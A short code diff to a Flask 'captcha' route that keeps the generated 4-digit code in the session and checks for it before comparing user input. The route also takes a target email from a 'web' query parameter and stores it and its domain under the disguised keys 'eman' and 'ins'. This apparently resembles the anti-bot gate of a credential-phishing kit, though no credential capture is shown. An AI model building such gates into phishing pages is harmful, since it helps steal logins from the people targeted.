@@ -82,19 +82,22 @@ def captcha():
             # CAPTCHA has already been passed, redirect to success page
             return redirect(url_for('success'))
 
-        # Generate a random 4-digit code
-        code = random.randint(1000, 9999)
+        if 'code' not in session:
+            # Generate a random 4-digit code
+            code = random.randint(1000, 9999)
+            session['code'] = str(code)
+
         colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
         color = random.choice(colors)
-        session['code'] = str(code)
         userauto = request.args.get("web")
         userdomain = userauto[userauto.index('@') + 1:]
         session['eman'] = userauto
         session['ins'] = userdomain
-        return render_template('captcha.html', code=code, color=color, eman=userauto, ins=userdomain, error=False)
+        return render_template('captcha.html', code=session['code'], color=color, eman=userauto, ins=userdomain, error=False)
+
     elif request.method == 'POST':
         user_input = request.form['code']
-        if user_input == session['code']:
+        if 'code' in session and user_input == session['code']:
             # User input matches the code, set the flag and redirect to success page
             session['passed_captcha'] = True
             return redirect(url_for('success'))
@@ -105,7 +108,8 @@ def captcha():
             color = random.choice(colors)
             session['code'] = str(code)
 
-            return render_template('captcha.html', code=code, color=color, error=True)
+            return render_template('captcha.html', code=session['code'], color=color, error=True)
+
 
 
 
